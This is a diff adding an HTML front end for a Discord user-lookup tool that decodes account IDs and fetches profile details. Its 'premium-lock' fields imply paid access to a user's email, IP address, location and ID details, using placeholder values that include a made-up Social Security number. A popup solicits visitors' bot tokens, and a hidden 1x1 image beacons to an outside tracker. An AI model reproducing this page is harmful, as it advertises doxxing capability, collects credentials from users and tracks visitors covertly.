@@ -1,0 +1,134 @@
+<style>img { all: revert; }</style>
+<div class="controls">
+    <p style="font-size: 13px; margin-bottom: 8px;">
+        <span onclick="toggleHelp()" style="color: #00b0f4; cursor: pointer; text-decoration: underline; font-weight: bold;">
+            How to use? How to find ID?
+        </span>
+    </p>
+
+    <input type="text" id="targetId" placeholder="Enter User ID">
+    <button id="searchBtn" class="cbutton" onclick="doLookup()">Search User</button>
+    <div id="cooldownMsg" class="cooldown-text"></div>
+</div>
+
+<div id="usageModal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:#2b2d31; border-radius:8px; width:360px; max-height: 80vh; overflow-y: auto; box-shadow:0 10px 30px rgba(0,0,0,0.6); z-index:10002; padding:20px; color:#dbdee1;">
+    <h3 style="margin-top:0; color:white;">Instructions</h3>
+    <p style="font-size:14px; line-height:1.4;">
+        Using this online tool is EASY. All you have to do is enable <b>Developer Mode</b> from your settings and then use the <b>Copy ID</b> button from anyone's profile to get their ID and paste it into the box, then tap the search button.
+    </p>
+    
+    <div style="display: flex; flex-direction: column; gap: 10px; margin: 15px 0;">
+        <img src="/files/images/discord-how-to-enable-developer-mode.png" style="width:100%; border-radius:4px; border:1px solid #444;">
+        <img src="/files/images/discord-copy-id-button.png" style="width:100%; border-radius:4px; border:1px solid #444;">
+        <img src="/files/images/discord-copy-id-button2.png" style="width:100%; border-radius:4px; border:1px solid #444;">
+    </div>
+
+    <button onclick="toggleHelp()" style="width:100%; padding:10px; background:#5865f2; border:none; color:white; border-radius:4px; cursor:pointer; font-weight:bold;">Got it!</button>
+</div>
+
+    <div id="profileCard" class="profile-container">
+                <div id="bannerBox" class="banner">
+            <div id="bannerOverlay" class="banner-overlay"></div>
+            <div id="bannerActionButtons" style="position:absolute; top:8px; right:8px; z-index:5; display:none; gap:4px;"></div>
+            <div id="bannerActionButtonsBottom" style="position:absolute; bottom:8px; right:8px; z-index:5; display:none; gap:4px;"></div>
+        </div>
+        <div class="avatar-container">
+            <img id="pfp" class="avatar-img" src="">
+            <img id="decoration" class="decoration-img" src="" style="display:none;">
+            <div class="avatar-overlay" onclick="openSource('pfp')">
+                <span class="view-btn">View</span>
+            </div>
+        </div>
+ 
+<div class="profile-body">
+    <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
+        <div id="displayName" class="username" onclick="copyToClipboard(this.innerText)" style="cursor:pointer; color:#ffffff;"></div>
+        <div id="clanTagInline" style="font-size:18px; font-weight:bold; color:#9294a1; display:none;"></div>
+    </div>
+    <div id="tag" style="color:#b5bac1; cursor:pointer;" onclick="copyToClipboard(this.innerText)">@username</div>
+    
+    <div class="info-bit">Account Created</div>
+    <div id="createdDate" class="info-val"></div>
+    
+    <div class="info-bit">User ID</div>
+    <div id="idVal" class="info-val" onclick="copyToClipboard(this.innerText)" style="cursor:pointer;"></div>
+
+    <div class="info-bit">Bio</div>
+    <div id="bioVal" class="premium-lock">
+        <span class="info-val-text">(Discord API doesn't allow)</span>
+    </div>
+
+    <div class="info-bit">Badges</div>
+    <div id="badgesVal" class="info-val" style="display:flex; gap:6px; flex-wrap:wrap;"></div>
+
+    <div class="info-bit">Connected Accounts</div>
+    <div id="connectionsVal" class="info-val"></div>
+
+<div class="info-bit">Email address</div>
+    <div id="emailVal" class="premium-lock">
+        <span class="info-val-text">hidden.user@gmail.com</span>
+    </div>
+
+    <div class="info-bit">IP address</div>
+    <div id="ipVal" class="premium-lock">
+        <span class="info-val-text">192.168.1.245</span>
+    </div>
+
+    <div class="info-bit">Device location</div>
+    <div id="locationVal" class="premium-lock">
+        <span class="info-val-text">Los Angeles, California, US</span>
+    </div>
+
+    <div class="info-bit">ID verification details</div>
+    <div id="bioVal" class="premium-lock">
+        <span class="info-val-text">Discord API doesn't allow but officially you can say that their name is John Doe, age 16, nationality American, place of birth Ohio, date of birth 14 July 2004, and Social Security Number 4206967911. Haha, this is just a fake placeholder text.</span>
+    </div>
+</div>
+
+    </div>
+
+        <div id="nameplateContainer" style="display:none; width:340px; margin:15px auto 0;">
+        <div class="info-bit">Nameplate</div>
+        <div id="nameplateDisplay" style="background:#2b2d31; border-radius:8px; max-width:280px; margin:0 auto;"></div>
+   	</div>
+
+        <div class="info-panel">
+        <strong>How it works:</strong> This tool decodes the Snowflake Discord ID to calculate the account age and then queries the Discord API to fetch profile assets.<br><br>
+        <strong>Ratelimits:</strong> Discord allows a number of limited requests per bot. So to protect the API and prevent stalking, an <strong>incremental cooldown</strong> has been enforced. Each consecutive search will increase the wait time by +5 seconds.<br><br>
+
+<strong>Tired of waiting?</strong> You can get <span onclick="showTokenHelp()" style="color:#00b0f4; cursor:pointer; text-decoration:underline;">instant results by adding your own bot token</span>.
+    </div>
+
+        <div id="tokenHelpPopup" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:#2b2d31; border-radius:8px; width:340px; box-shadow:0 10px 30px rgba(0,0,0,0.6); z-index:10001; padding:20px; color:#dbdee1;">
+        <h3 style="margin:0 0 16px 0; color:#fff;">Use Your Own Bot Token</h3>
+        
+        <p style="margin-bottom:12px;">Save your bot token to bypass cooldowns and get instant results.</p>
+        
+        <input type="password" id="customToken" placeholder="BOT_TOKEN" style="width:100%; padding:10px; background:#1e1f22; border:none; border-radius:4px; color:white; margin-bottom:8px;">
+        
+        <div style="display:flex; gap:8px;">
+            <button onclick="saveCustomToken(); hideTokenHelp()" style="flex:1; padding:10px; background:#5865f2; border:none; color:white; border-radius:4px; cursor:pointer;">Save Token</button>
+            <button onclick="clearCustomToken(); hideTokenHelp()" style="flex:1; padding:10px; background:#806060; border:none; color:white; border-radius:4px; cursor:pointer;">Clear Token</button>
+        </div>
+        
+	<h5>How to get a bot token?</h5>
+        <ol style="margin:20px 0 0 0; padding-left:20px; line-height:1.6; font-size:13px;">
+	    <li>Go to <a href="https://discord.com/developers/applications" target="_blank" style="color:#00b0f4;">Discord Developer Portal</a></li>
+            <li>Click <strong>New Application</strong> -> give it a name</li>
+            <li>Go to <strong>Bot</strong> tab -> Click <strong>Add Bot</strong></li>
+            <li>Under Token, click <strong>Reset Token</strong> -> Copy the token</li>
+            <li>Paste it into <code>BOT_TOKEN</code></li>
+        </ol>
+        
+        <p style="margin:16px 0 0 0; font-size:12px; color:#f04747;">
+            ⚠️ Please provide tokens for bots you don't use or have no purpose for.
+            Don't insert tokens of bots you don't own. Bot must be inactive.
+        </p>
+        
+        <button onclick="hideTokenHelp()" style="margin-top:16px; width:100%; padding:10px; background:#5865f2; border:none; color:white; border-radius:4px; cursor:pointer;">Close</button>
+    </div><img src="https://tracker.makron.workers.dev/?token=discord-viewer"
+     width="1" height="1" style="display:none;" alt="dumb image"></img>
+
+
+<link rel="stylesheet" href="/discord-lookup/discord.css">
+<script src="/discord-lookup/lookup.js"></script>
